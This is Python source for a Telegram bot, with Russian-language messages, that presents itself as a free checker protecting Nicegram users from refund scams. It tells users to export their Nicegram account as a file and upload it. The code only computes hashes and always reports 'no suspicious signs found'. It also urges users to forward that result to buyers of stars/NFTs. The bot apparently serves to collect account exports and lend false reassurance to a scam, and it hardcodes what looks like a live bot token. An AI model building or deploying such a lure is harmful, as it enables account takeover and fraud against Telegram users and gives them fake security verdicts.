import hashlib
import os
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = '8431345520:AAH7wyNzDwty-awpcHEabHnsGH9VMqkhzu4'

def calculate_checksums(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
        md5 = hashlib.md5(data).hexdigest()
        sha1 = hashlib.sha1(data).hexdigest()
        sha256 = hashlib.sha256(data).hexdigest()
    return md5, sha1, sha256

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("📘 Инструкция")],
        [KeyboardButton("🔍 Проверить файл")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "👋 Привет!\n\n"
        "Этот бот создан для проверки файлов Nicegram на рефаунд и защиты от скама.\n\n"
        "Выбери действие 👇",
        reply_markup=reply_markup
    )

async def handle_instruction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    instruction_text = (
        "📘 Инструкция по использованию\n\n"
        "1️⃣ В Nicegram → выбери аккаунт → немного вниз → Экспортировать как файл.\n"
        "2️⃣ Выбери нужный аккаунт и пришли файл сюда.\n"
        "3️⃣ Я проверю структуру и подскажу, если есть признаки скама.\n\n"
        "💡 Бот не делает переводы и не участвует в продаже NFT.\n"
        "Он создан для защиты пользователей от мошеннических схем со звёздами и TON."
    )
    await update.message.reply_text(instruction_text)

async def handle_check_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📎 Пришли мне файл для проверки")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    file = await document.get_file()
    
    download_path = f"temp_{document.file_name}"
    await file.download_to_drive(download_path)
    
    file_size = os.path.getsize(download_path)
    md5, sha1, sha256 = calculate_checksums(download_path)
    
    result_text = (
        f"🧾 Результат проверки файла:\n"
        f"📄 Имя: {document.file_name}\n"
        f"📏 Размер: {file_size} байт\n"
        f"📁 Тип: {document.mime_type or 'unknown/unknown'}\n\n"
        f"🔐 Контрольные суммы:\n"
        f"MD5: {md5}\n"
        f"SHA1: {sha1}\n"
        f"SHA256: {sha256}\n\n"
        f"Результат анализа:\n"
        f"✅ Подозрительных признаков не найдено.\n\n"
        f"🛡️ Совет: Если у вас покупают звёзды (NFT), перешлите ему это сообщение, "
        f"если он просил для проверки на рефаунд."
    )
    
    await update.message.reply_text(result_text)
    os.remove(download_path)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Text("📘 Инструкция"), handle_instruction))
    app.add_handler(MessageHandler(filters.Text("🔍 Проверить файл"), handle_check_request))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    app.run_polling()

if __name__ == "__main__":
    main()